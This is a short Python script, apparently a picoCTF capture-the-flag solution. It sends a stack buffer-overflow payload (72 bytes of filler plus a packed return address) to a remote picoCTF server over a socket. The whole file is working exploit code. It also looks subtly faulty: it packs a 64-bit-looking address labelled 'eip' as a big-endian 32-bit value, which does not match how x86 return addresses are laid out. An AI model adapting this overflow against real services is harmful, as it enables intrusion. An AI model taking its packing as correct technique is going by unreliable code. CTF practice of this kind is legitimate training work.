#!/usr/bin/env python
import socket
import struct

host = 'saturn.picoctf.net'
port = 58459

offset = 72
filler = b'A' * offset

eip = struct.pack(">I", 0x000000000040123b)

payload = b''.join([
    filler,
    eip
])

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
print(s.recv(1024))
s.send(payload)
print(s.recv(1024))
s.close()